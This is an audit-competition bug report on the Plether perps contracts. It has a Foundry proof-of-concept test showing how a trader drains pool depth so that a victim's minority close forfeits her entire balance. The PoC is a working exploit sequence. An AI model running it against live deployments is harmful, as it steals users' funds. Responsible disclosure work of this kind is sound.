# \#99272 [SC-High] Minority close drains idle collateral at near-zero pool depth

**Submitted on Nov 12th 2026 at 19:30:01 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99272
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A profitable trader can take nearly all the pool's remaining cash with a partial close, leaving a small *positive* depth. The next minority-side close then pays VPI against that tiny denominator. The charge can take the closing trader's whole clearinghouse balance, including USDG that was never posted as position margin.

I reproduced this through the V3 order path with release parameters. A winning partial close left **15.204759 USDG** of depth. The victim's queued close was for **7,000 USDG notional**, yet its fresh VPI preview was **982,915.940989 USDG**. The close executed and transferred **59,987.791451 USDG** from the victim's account to HousePool. Her balance and claim were both zero afterward. Immediately before the drain, the same close would have *credited* her **1,730.466150 USDG**.

## Vulnerability Details
[Close VPI](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L119) is skipped only when depth equals zero. At any positive depth, [`CfdMath`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L118-L179) divides the change in squared skew by that depth. The input is [pool assets minus trader claims](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1328-L1346). There is no floor on the denominator and no positive-charge cap tied to the closed position.

A winning trader can deliberately leave depth above zero. [`_payOrRecordTraderClaim`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L840-L871) pays a close payout in cash if it fits the available pool cash; otherwise it records the whole payout as a claim. A partial close sized just below available cash gets paid and creates no claim. The victim's close then follows it in the global FIFO queue.

The large VPI is collected from more than the position. The [close planner](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1134) withholds the victim's price gain, then uses spendable action reserve, free settlement, released margin and, on a full close, committed margin. It waives only what remains after those sources run out. [Settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L700-L718) moves the collected USDG to the pool. The negative-VPI lifetime clamp does not limit a positive close charge.

## Impact Details
The test starts with a funded Junior pool and two SHORT positions opened at a 1.00 basket price. At 1.90, a large LONG opens and the LP redeems through the normal epoch flow. The large SHORT closes; pool cash falls to **219,525.985948 USDG**, no trader claim is created, and degraded mode latches. The basket returns to 1.40. The LONG holder commits a 445,000-token partial close ahead of the victim's 5,000-token SHORT close. That partial payout leaves **15.204759 USDG** depth and still no claims.

The victim had **54,999.800000 USDG of free settlement** before her close. When the queued close executes, the pool receives **59,987.791451 USDG** from her account. A matched run without the preceding partial close credits her **1,730.466150 USDG** instead. These are executed balance changes, not just a quote.

After the victim's funds enter the pool, the winning trader can close the rest and withdraw **59,983.748032 USDG more cash** than in the control. Its outstanding claim falls by **59,983.749901 USDG**. The claim was not withdrawable in the tested deficit state; the PoC shows a conversion to cash, **not** an increase in the attacker's nominal cash-plus-claim balance.

The direct debit requires a permissive V3 `maxActionChargeAssets` bound. With a **1,000 USDG** bound, the close fails instead. The victim keeps her position and free balance, but [degraded mode blocks withdrawal](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L275) seven days later in the test, and the owner's [solvency check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L666) prevents clearing the mode. Recapitalization or a later state change could release the funds; permanent freezing is not claimed.

The basket path is a market precondition supplied by mock Pyth, not attacker price control. A second test shows the same pricing problem without degraded mode: an ordinary LP redemption reduces depth from **10,008,478.704259** to **426,000.008749 USDG**. A minority LONG close at an unchanged price costs **15,437.943668 USDG**, versus **703.304591 USDG** before redemption, despite only **3,600 USDG** of position margin.


## Proof of Concept

## Proof of Concept

Attach the single file [`PoC_DustDepthVpiClose.t.sol`](poc/PoC_DustDepthVpiClose.t.sol) directly to the report. To run it, place the file at `packages/perps/test/poc/PoC_DustDepthVpiClose.t.sol` in the pinned repository checkout. It changes nothing under `src/`. The test uses `BasePerpTest` and the inherited production V3 Router methods, not its test-only scalar commit overload. Only Pyth and USDG are mocked.

```sh
forge test --root packages/perps --offline --match-path 'test/poc/PoC_DustDepthVpiClose.t.sol' -vv
```

**Observed at the pinned commit: 2 passed, 0 failed.** The tests assert execution status, victim-to-pool cash movement, the charge-bound rejection, the seven-day withdrawal rejection, the attacker cash/claim comparison, and the non-degraded control.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Public-path reproduction of a minority close's uncapped VPI at shallow LP depth.
contract PoC_DustDepthVpiClose is BasePerpTest {

    address internal constant SHORT = address(0x5001);
    address internal constant VICTIM = address(0x5002);
    address internal constant KEEPER = address(0x5003);
    address internal constant ATTACKER = address(0x5004);
    uint256 internal constant PRICE = 180_000_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);
        _fundJunior(address(this), 10_000_000e6);
        _fundTrader(SHORT, 500_000e6);
        _fundTrader(VICTIM, 50_000e6);
        _mark(PRICE);
    }

    function _mark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        return _orderAt(account, side, size, margin, close, PRICE);
    }

    function _orderAt(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(account, side, size, margin, close);
        return _execute(id, price);
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close
    ) internal returns (uint64 id) {
        return _commitBounded(account, side, size, margin, close, type(uint256).max);
    }

    function _commitBounded(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 maxAction
    ) internal returns (uint64 id) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: maxAction,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _bestDrainingChunk(
        uint256 dustTarget
    ) internal view returns (uint256 size, uint256 payout) {
        uint256 available = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        (uint256 positionSize,,,,,,) = engine.positions(ATTACKER);
        uint256 lo;
        uint256 hi = positionSize / 100e18 - 1;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            ICfdEngineTypes.ClosePreview memory p = engineLens.previewClose(ATTACKER, mid * 100e18, 140_000_000);
            if (p.valid && p.deferredPayoutAssets == 0 && p.immediatePayoutAssets <= available - dustTarget) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        ICfdEngineTypes.ClosePreview memory best = engineLens.previewClose(ATTACKER, lo * 100e18, 140_000_000);
        assertTrue(best.valid && best.deferredPayoutAssets == 0);
        size = lo * 100e18;
        payout = best.immediatePayoutAssets;
    }

    function _redeemToTarget(
        uint256 markPrice,
        uint256 targetAssets
    ) internal {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _mark(markPrice);
        uint256 maxShares = juniorVault.maxRequestRedeem(address(this));
        (,,, uint256 cap) = pool.getPendingTrancheState();
        uint256 desired = pool.totalAssets() - targetAssets;
        assertLe(desired, cap, "target must be within LP cap");
        uint256 shares = juniorVault.estimateWithdrawShares(desired);
        if (shares > maxShares) {
            shares = maxShares;
        }
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(pool.lpEpochStart(requestId));
        _mark(markPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_mockPythUpdateData(markPrice));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertGt(claimable, 0);
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
    }

    function _redeemToLimit() internal {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _mark(PRICE);
        uint256 maxShares = juniorVault.maxRequestRedeem(address(this));
        assertGt(maxShares, 0, "LP matured");
        (,,, uint256 maxJuniorWithdrawAssets) = pool.getPendingTrancheState();
        emit log_named_decimal_uint("maximum junior withdrawal", maxJuniorWithdrawAssets, 6);
        // Leave enough headroom for the opposing opening's extra settlement buffer.
        uint256 shares = juniorVault.estimateWithdrawShares(maxJuniorWithdrawAssets - 25_000e6);
        if (shares > maxShares) {
            shares = maxShares;
        }
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        vm.warp(pool.lpEpochStart(requestId));
        _mark(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertGt(claimable, 0, "LP exit funded");
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
        emit log_named_decimal_uint("depth after public LP withdrawal", pool.totalAssets(), 6);
    }

    function test_NonDegradedMinorityCloseConsumesIdleCollateralAfterLpExit() public {
        _order(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 200_000e6, false);
        uint256 healthyDepth = pool.totalAssets();
        uint256 snapshot = vm.snapshotState();
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 3600e6, false);
        uint256 healthyBefore = clearinghouse.balanceAssets(VICTIM);
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 0, true);
        uint256 healthyDebit = healthyBefore - clearinghouse.balanceAssets(VICTIM);
        assertTrue(vm.revertToState(snapshot));
        vm.deleteStateSnapshot(snapshot);

        _redeemToLimit();
        uint256 shallowDepth = pool.totalAssets();
        assertLt(shallowDepth, healthyDepth / 10, "redemption must shrink depth");
        assertFalse(engine.degradedMode());
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 3600e6, false);
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        uint256 victimFreeBefore = clearinghouse.getFreeBuyingPowerAssets(VICTIM);
        uint256 poolBefore = pool.totalAssets();
        _order(VICTIM, CfdTypes.Side.LONG, 100_000e18, 0, true);
        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 shallowDebit = victimBefore - victimAfter;
        emit log_named_decimal_uint("healthy depth", healthyDepth, 6);
        emit log_named_decimal_uint("shallow depth", shallowDepth, 6);
        emit log_named_decimal_uint("healthy victim close debit", healthyDebit, 6);
        emit log_named_decimal_uint("shallow victim close debit", shallowDebit, 6);
        emit log_named_decimal_uint("victim idle before shallow close", victimFreeBefore, 6);
        emit log_named_decimal_uint("pool gained from shallow close", pool.totalAssets() - poolBefore, 6);
        assertGt(shallowDebit, healthyDebit * 4, "same close charge scales with inverse depth");
        assertGt(shallowDebit, 3600e6, "charge exceeds position margin");
        assertFalse(engine.degradedMode());
        (uint256 remaining,,,,,,) = engine.positions(VICTIM);
        assertEq(remaining, 0);
    }

    function test_DeficitWinnerCanDrainDepthBeforeMinorityClose() public {
        _mark(1e8);
        _fundTrader(ATTACKER, 100_000e6);
        _fundTrader(VICTIM, 10_000e6);
        _orderAt(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 200_000e6, false, 1e8);
        _orderAt(VICTIM, CfdTypes.Side.SHORT, 5000e18, 5000e6, false, 1e8);
        _mark(190_000_000);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, 600_000e18, 30_000e6, false, 190_000_000);
        _redeemToTarget(190_000_000, 2_020_000e6);
        emit log_named_decimal_uint("pool after LP exit", pool.totalAssets(), 6);
        _orderAt(SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 0, true, 190_000_000);
        emit log_named_decimal_uint("pool after initial SHORT winner", pool.totalAssets(), 6);
        emit log_named_decimal_uint("claims after initial SHORT winner", engine.totalTraderClaimBalanceAssets(), 6);
        emit log_named_uint("degraded", engine.degradedMode() ? 1 : 0);
        _mark(140_000_000);
        emit log_named_decimal_uint("victim balance before", clearinghouse.balanceAssets(VICTIM), 6);
        emit log_named_decimal_uint("victim idle before", clearinghouse.getFreeBuyingPowerAssets(VICTIM), 6);
        emit log_named_decimal_uint("attacker balance before", clearinghouse.balanceAssets(ATTACKER), 6);
        emit log_named_decimal_uint("pool before attacker close", pool.totalAssets(), 6);
        uint256 state = vm.snapshotState();
        uint256 victimControlBefore = clearinghouse.balanceAssets(VICTIM);
        _orderAt(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true, 140_000_000);
        uint256 victimControlAfter = clearinghouse.balanceAssets(VICTIM);
        assertGt(victimControlAfter, victimControlBefore, "same close is profitable before depth drain");
        emit log_named_decimal_uint("victim close proceeds without drain", victimControlAfter - victimControlBefore, 6);
        assertTrue(vm.revertToState(state));
        vm.deleteStateSnapshot(state);

        (uint256 chunk, uint256 previewPayout) = _bestDrainingChunk(1e6);
        emit log_named_decimal_uint("chosen partial close size tokens", chunk / 1e18, 0);
        emit log_named_decimal_uint("preview partial close cash", previewPayout, 6);
        uint256 attackStartState = vm.snapshotState();
        _orderAt(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true, 140_000_000);
        (uint256 controlRemaining,,,,,,) = engine.positions(ATTACKER);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, controlRemaining, 0, true, 140_000_000);
        uint256 controlClaim = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 controlWithdrawable = clearinghouse.getFreeBuyingPowerAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, controlWithdrawable);
        uint256 controlWallet = settlementToken.balanceOf(ATTACKER);
        assertTrue(vm.revertToState(attackStartState));
        vm.deleteStateSnapshot(attackStartState);

        uint256 boundedState = vm.snapshotState();
        uint64 boundedAttackerId = _commit(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 boundedVictimId = _commitBounded(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true, 1000e6);
        _execute(boundedAttackerId, 140_000_000);
        OrderV3Types.ExecutionResult memory bounded =
            router.executeOrder(boundedVictimId, _mockPythUpdateData(140_000_000));
        assertEq(uint8(bounded.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(bounded.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        (uint256 boundedPosition,,,,,,) = engine.positions(VICTIM);
        assertEq(boundedPosition, 5000e18, "bounded close leaves victim exposed");
        vm.warp(vm.getBlockTimestamp() + 7 days);
        vm.prank(VICTIM);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(VICTIM, 1e6);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        assertTrue(vm.revertToState(boundedState));
        vm.deleteStateSnapshot(boundedState);

        uint64 attackerOrderId = _commit(ATTACKER, CfdTypes.Side.LONG, chunk, 0, true);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 victimOrderId = _commit(VICTIM, CfdTypes.Side.SHORT, 5000e18, 0, true);
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        assertGt(clearinghouse.getFreeBuyingPowerAssets(VICTIM), 54_000e6, "idle funds are not position margin");
        _execute(attackerOrderId, 140_000_000);
        uint256 dustDepth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        emit log_named_decimal_uint("depth before victim's queued close", dustDepth, 6);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "winner's partial close is paid in cash");
        assertGt(dustDepth, 0);
        assertLt(dustDepth, 50e6);
        ICfdEngineTypes.ClosePreview memory dustQuote = engineLens.previewClose(VICTIM, 5000e18, 140_000_000);
        assertTrue(dustQuote.valid, "full close remains executable at positive dust depth");
        assertGt(dustQuote.vpiAssets, victimBefore, "fresh VPI exceeds the entire victim account");
        emit log_named_decimal_uint("fresh victim close VPI at dust depth", dustQuote.vpiAssets, 6);
        uint256 poolBeforeVictim = pool.totalAssets();
        _execute(victimOrderId, 140_000_000);
        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_decimal_uint("victim balance after queued close", victimAfter, 6);
        emit log_named_decimal_uint("victim balance taken", victimBefore - victimAfter, 6);
        emit log_named_decimal_uint("pool inflow from victim close", pool.totalAssets() - poolBeforeVictim, 6);
        assertEq(victimAfter, 0, "victim's entire clearinghouse account is consumed");
        assertEq(engine.traderClaimBalanceAssets(VICTIM), 0, "no replacement claim is issued");
        assertEq(pool.totalAssets() - poolBeforeVictim, victimBefore - victimAfter, "victim funds enter pool");
        (uint256 secondChunk,) = _bestDrainingChunk(1e6);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, secondChunk, 0, true, 140_000_000);
        (uint256 attackRemaining,,,,,,) = engine.positions(ATTACKER);
        _orderAt(ATTACKER, CfdTypes.Side.LONG, attackRemaining, 0, true, 140_000_000);
        uint256 attackClaim = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 attackWithdrawable = clearinghouse.getFreeBuyingPowerAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, attackWithdrawable);
        uint256 attackWallet = settlementToken.balanceOf(ATTACKER);
        emit log_named_decimal_uint("control attacker withdrawable wallet", controlWallet, 6);
        emit log_named_decimal_uint("attack attacker withdrawable wallet", attackWallet, 6);
        emit log_named_decimal_uint("control attacker claim", controlClaim, 6);
        emit log_named_decimal_uint("attack attacker claim", attackClaim, 6);
        assertGt(attackWallet, controlWallet + 50_000e6, "victim's cash is withdrawable by attacker");
        assertLt(attackClaim + 50_000e6, controlClaim, "attacker's unbacked claim falls");
        assertApproxEqAbs(
            attackWallet - controlWallet,
            controlClaim - attackClaim,
            1e6,
            "cash increase comes from advancing the winner's claim"
        );
    }

}

```
